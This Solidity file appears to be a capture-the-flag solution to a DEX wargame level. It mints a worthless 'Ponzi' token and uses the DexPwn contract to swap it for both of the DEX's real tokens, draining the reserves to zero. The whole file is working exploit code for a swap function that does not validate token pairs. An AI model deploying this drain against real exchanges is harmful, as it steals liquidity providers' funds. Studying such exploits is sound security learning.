//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0x4e39A0fFd646Bf950b1adA00485E917B22222c3A
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDex {

    function token1() external returns(address);
    function token2() external returns(address);
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint); 
}

// interface IERC20 {
//     function approve(address spender, uint256 amount) external returns (bool);
//     function transferFrom(address from, address to, uint256 amount) external returns (bool);
//     function balanceOf(address account) external view returns (uint256);
// }

contract Ponzi is ERC20 {

    constructor()ERC20('Ponzi', 'PNZ') {
           _mint(msg.sender, 500); 
    }
}

contract DexPwn {

    IDex dex;
    IERC20 public token1;
    IERC20 public token2;
    IERC20 public ponzi;

    constructor(IDex _dex, address _ponziAddr)  {
        dex = _dex;   
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
        ponzi = IERC20(_ponziAddr);
    }

    function pwn() public {
        // token1.transferFrom(msg.sender, address(this), 10);
        ponzi.transferFrom(msg.sender, address(this), 500);
        ponzi.transfer(address(dex), 100);
        ponzi.approve(address(dex), 1000);


        dex.approve(address(dex), 1000);
        dex.swap(address(ponzi), address(token1), 100); 
        dex.swap(address(ponzi), address(token2), 200);

        require(token1.balanceOf(address(dex)) == 0, "Token 1 Dex Reserves != 0");
        require(token2.balanceOf(address(dex)) == 0, "Token 2 Dex Reserves != 0");      
      
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }

}